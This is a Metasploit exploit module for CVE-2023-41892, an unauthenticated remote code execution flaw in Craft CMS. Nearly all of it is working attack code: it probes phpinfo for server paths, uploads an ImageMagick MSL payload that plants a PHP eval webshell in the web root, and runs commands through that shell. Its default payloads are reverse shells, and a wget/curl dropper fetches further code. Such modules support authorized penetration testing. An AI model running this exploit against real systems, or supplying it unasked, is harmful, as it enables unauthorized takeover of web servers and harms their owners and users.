##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Craft CMS unauthenticated Remote Code Execution (RCE)',
        'Description' => %q{
          This module exploits Remote Code Execution vulnerability (CVE-2023-41892) in Craft CMS which is a popular
          content management system. Craft CMS versions between 4.0.0-RC1 - 4.4.14 are  affected by this vulnerability
          allowing attackers to execute arbitrary code remotely, potentially compromising the security and integrity
          of the application.

          The vulnerability occurs using a PHP object creation in the `\craft\controllers\ConditionsController` class
          which allows to run arbitrary PHP code by escalating the object creation calling some methods available in
          `\GuzzleHttp\Psr7\FnStream`. Using this vulnerability in combination with The Imagick Extension and MSL which
          stands for Magick Scripting Language, a full RCE can be achieved. MSL is a built-in ImageMagick language that
          facilitates the reading of images, performance of image processing tasks, and writing of results back
          to the filesystem. This can be leveraged to create a dummy image containing malicious PHP code using the
          Imagick constructor class delivering a webshell that can be accessed by the attacker, thereby executing the
          malicious PHP code and gaining access to the system.

          Because of this, any remote attacker, without authentication, can exploit this vulnerability to gain
          access to the underlying operating system as the user that the web services are running as (typically www-data).
        },
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Metasploit module
          'Thanh', # discovery
          'chybeta' # poc
        ],
        'References' => [
          [ 'CVE', '2023-41892' ],
          [ 'URL', 'https://blog.calif.io/p/craftcms-rce' ],
          [ 'URL', 'https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/' ],
          [ 'URL', 'https://github.com/advisories/GHSA-4w8r-3xrw-v25g' ],
          [ 'URL', 'https://attackerkb.com/topics/2u7OaYlv1M/cve-2023-41892' ],
        ],
        'License' => MSF_LICENSE,
        'Platform' => [ 'unix', 'linux', 'php' ],
        'Privileged' => false,
        'Arch' => [ ARCH_CMD, ARCH_PHP, ARCH_X64, ARCH_X86 ],
        'Targets' => [
          [
            'PHP',
            {
              'Platform' => 'php',
              'Arch' => ARCH_PHP,
              'Type' => :php,
              'DefaultOptions' => {
                'PAYLOAD' => 'php/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Unix Command',
            {
              'Platform' => [ 'unix', 'linux' ],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ ARCH_X64, ARCH_X86 ],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => [ 'wget', 'curl', 'printf', 'bourne' ],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2023-09-13',
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 443
        },
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ]
        }
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [ true, 'Craft CMS base url', '/' ]),
        OptString.new('WEBSHELL', [
          false, 'The name of the webshell with extension .php. Webshell name will be randomly generated if left unset.', ''
        ]),
        OptEnum.new('COMMAND', [ true, 'Use PHP command function', 'passthru', [ 'passthru', 'shell_exec', 'system', 'exec' ]], conditions: %w[TARGET != 0])
      ]
    )
  end

  def check_phpinfo
    # checks vulnerability running phpinfo() and returns upload_tmp_dir and DOCUMENT_ROOT
    @config = { 'upload_tmp_dir' => nil, 'document_root' => nil }

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'action' => 'conditions/render',
        'configObject[class]' => 'craft\elements\conditions\ElementCondition',
        'config' => '{"name":"configObject","as ":{"class":"\\\GuzzleHttp\\\Psr7\\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'
      }
    })
    if res && res.body
      # parse HTML to find the upload directory and the document root provided by phpinfo command output
      html = res.get_html_document
      unless html.blank?
        tr_items = html.css('tr td')
        tr_items.each_with_index do |item, i|
          next if tr_items[i + 1].nil?

          if item.text.casecmp?('upload_tmp_dir')
            if tr_items[i + 1].text.casecmp?('no value')
              @config['upload_tmp_dir'] = '/tmp'
            else
              @config['upload_tmp_dir'] = tr_items[i + 1].text.strip
            end
          end
          @config['document_root'] = tr_items[i + 1].text.strip if item.text.casecmp?('$_SERVER[\'DOCUMENT_ROOT\']')
        end
      end
    end
  end

  def upload_webshell
    # randomize file name if option WEBSHELL is not set
    if datastore['WEBSHELL'].blank?
      @webshell_name = "#{Rex::Text.rand_text_alpha(8..16)}.php"
    else
      @webshell_name = datastore['WEBSHELL'].to_s
    end

    # select webshell depending on the target setting (PHP or others).
    @post_param = Rex::Text.rand_text_alphanumeric(1..8)
    @get_param = Rex::Text.rand_text_alphanumeric(1..8)

    if target['Type'] == :php
      # create the MSL payload
      # payload = "<?php @eval(base64_decode($_POST[\'#{@post_param}\']));?>"
      payload = <<~EOS
        <?xml version="1.0" encoding="UTF-8"?>
        <image>
        <read filename="caption:&lt;?php @eval(base64_decode($_POST[\'#{@post_param}\'])); ?&gt;" />
        <write filename="info:#{@config['document_root']}/#{@webshell_name}" />
        </image>
      EOS
    else
      # create the MSL payload
      # payload = "<?=#{datastore['COMMAND']}(base64_decode($_POST[\'#{@post_param}\']));?>"
      payload = <<~EOS
        <?xml version="1.0" encoding="UTF-8"?>
        <image>
        <read filename="caption:&lt;?=#{datastore['COMMAND']}(base64_decode($_POST[\'#{@post_param}\'])); ?&gt;" />
        <write filename="info:#{@config['document_root']}/#{@webshell_name}" />
        </image>
      EOS
    end

    # construct multipart form data with Imagick MSL payload
    form_data = Rex::MIME::Message.new
    form_data.add_part('conditions/render', nil, nil, 'form-data; name="action"')
    form_data.add_part('craft\elements\conditions\ElementCondition', nil, nil, 'form-data; name="configObject[class]"')
    form_data.add_part('{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/dev/null"}}}', nil, nil, 'form-data; name="config"')
    form_data.add_part(payload, 'text/plain', nil, "form-data; name=\"#{Rex::Text.rand_text_alpha(4..8)}\"; filename=\"#{Rex::Text.rand_text_alpha(4..8)}.msl\"")

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'ctype' => "multipart/form-data; boundary=#{form_data.bound}",
      'data' => form_data.to_s
    })
    if res && res.code == 502
      # code 502 indicates a successful upload of the MSL payload in upload_tmp_dir (default /tmp unless specified in php.ini)
      # next step is to generate the webshell in DOCUMENT_ROOT by executing the Imagick MSL payload
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(datastore['TARGETURI']),
        'ctype' => 'application/x-www-form-urlencoded',
        'vars_post' => {
          'action' => 'conditions/render',
          'configObject[class]' => 'craft\elements\conditions\ElementCondition',
          'config' => "{\"name\":\"configObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"vid:msl:#{@config['upload_tmp_dir']}/php*\"}}}"
        }
      })
      # code 502 indicates a successful generation of the webshell in DOCUMENT_ROOT
      return res&.code == 502
    end
    false
  end

  def execute_command(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    return send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], @webshell_name),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        @post_param => payload
      }
    })
  end

  def on_new_session(session)
    # cleanup webshell in DOCUMENT_ROOT
    register_files_for_cleanup("#{@config['document_root']}/#{@webshell_name}")

    # Imagick plugin generates a php<random chars> file with MSL code in the directory set by
    # the PHP ini setting "upload_tmp_dir". This file gets executed to generate the webshell.
    # A manual cleanup procedure is required to identify and remove the php* files when the session is established.
    if session.type == 'meterpreter'
      session.fs.dir.chdir(@config['upload_tmp_dir'].to_s)
      clean_files = session.fs.dir.entries
    else
      clean_files = session.shell_command_token("cd #{@config['upload_tmp_dir']};ls php*").split(' ')
    end
    unless clean_files.blank?
      clean_files.each do |f|
        register_files_for_cleanup("#{@config['upload_tmp_dir']}/#{f}") if f.match(/^php+/)
      end
    end
    super
  end

  def check
    check_phpinfo
    return CheckCode::Appears unless @config['upload_tmp_dir'].nil? || @config['document_root'].nil?

    CheckCode::Safe
  end

  def exploit
    # check if upload_tmp_dir and document_root is already initialized with AutoCheck set otherwise run check_phpinfo
    check_phpinfo unless datastore['AutoCheck']
    fail_with(Failure::NotVulnerable, 'Could not get required phpinfo. System is likely patched.') if @config['upload_tmp_dir'].nil? || @config['document_root'].nil?
    fail_with(Failure::UnexpectedReply, "Webshell #{@webshell_name} upload failed.") unless upload_webshell

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :php, :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager(linemax: 65536)
    end
  end
end
